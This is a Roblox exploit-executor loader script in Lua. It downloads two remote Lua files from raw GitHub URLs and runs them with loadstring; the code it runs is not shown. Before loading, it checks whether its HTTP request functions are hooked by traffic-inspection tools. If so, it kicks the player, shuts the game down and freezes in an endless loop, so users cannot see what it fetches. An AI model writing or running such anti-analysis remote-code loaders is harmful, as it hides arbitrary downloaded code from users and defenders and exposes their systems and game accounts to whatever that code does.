
--...




local ANTI_URL = "https://raw.githubusercontent.com/czcasdfwdk/dyk--czc/main/synbdyknbhhhh.lua"
local TARGET_URL = "https://raw.githubusercontent.com/czcasdfwdk/dyk-jzq-czc/main/dykjzqjzq2-czc.lua"

local function selfDestruct()
    pcall(function()
        local player = game.Players.LocalPlayer
        if player then
            player:Kick("检测到抓包工具")
        end
    end)
    pcall(game.Shutdown, game)
    while true do
        task.wait()
    end
end

local function isHooked(func)
    local ok, result = pcall(function()
        if isfunctionhooked then
            return isfunctionhooked(func)
        end
        return false
    end)
    return ok and result or false
end

if isHooked(game.HttpGet) or isHooked(game.HttpPost) then
    selfDestruct()
    return
end

local req = request or http_request or (syn and syn.request)
if req and isHooked(req) then
    selfDestruct()
    return
end

spawn(function()
    local startTime = os.clock()
    while task.wait(0.5) do
        if os.clock() - startTime > 30 then
            break
        end
        pcall(function()
            if isHooked(game.HttpGet) or isHooked(game.HttpPost) then
                selfDestruct()
            end
            local r = request or http_request
            if r and isHooked(r) then
                selfDestruct()
            end
        end)
    end
end)

local function loadScript(url)
    local success, response = pcall(function()
        return game:HttpGet(url)
    end)
    if success and response and #response > 10 then
        local func, err = loadstring(response)
        if func then
            pcall(func)
            return true
        end
    end
    return false
end


local antiOk = loadScript(ANTI_URL)
if antiOk then
    task.wait(0.5)
    loadScript(TARGET_URL)
end
